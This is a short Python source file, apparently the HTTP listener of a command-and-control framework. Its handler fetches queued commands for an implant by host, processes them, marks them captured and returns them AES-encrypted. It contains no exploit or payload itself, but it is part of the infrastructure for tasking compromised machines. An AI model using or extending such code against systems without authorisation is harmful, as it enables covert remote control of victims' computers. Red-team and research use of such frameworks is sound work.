import asyncio

from infra.database.database import Queue
from infra.database.listener_utils import listener_utils
from infra.general.create_log import logger, write_log
from ...utils.crypt import respond
from .capabilities.custom import custom_input
from .capabilities.actions import check_actions


async def main_input(content, config, aes_key=None, body=None, request=None):
    # Main function that loads queued commands for the implant
    try:
        host = content.get("host", "")

        commands = await listener_utils.get_queue_action(host)

        if not commands:
            return await respond(aes_key, {"commands": []}, config=config)

        processed = []

        for command in commands:
            row_data = {"status": "success", **command}
            row_data = await custom_input(row_data)
            if row_data is None:
                return await respond(aes_key, {"status": "failure", "error": "Task processing error"}, config=config)

            await check_actions(row_data)
            await listener_utils.modify(Queue, filters={"tag": row_data["task_tag"]}, changes={"captured": 1})
            processed.append(row_data)

        return await respond(aes_key, {"commands": processed}, config=config)
    except asyncio.CancelledError:
        return await respond(aes_key, {"commands": []}, config=config)
    except Exception as e:
        write_log(logger, "error", f"Unhandled exception | listeners/http/input | {e}")
        return await respond(aes_key, {"status": "failure", "error": "internal error"}, config=config)
